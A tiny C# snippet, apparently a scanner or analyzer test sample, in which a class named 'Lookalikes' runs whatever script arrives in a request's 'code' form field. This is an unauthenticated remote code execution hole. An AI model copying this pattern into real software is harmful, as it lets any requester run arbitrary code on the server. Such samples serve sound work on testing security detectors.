class Lookalikes
{
    object Execute(dynamic Request)
    {
        return CustomScript.Execute(Request.Form["code"]);
    }
}
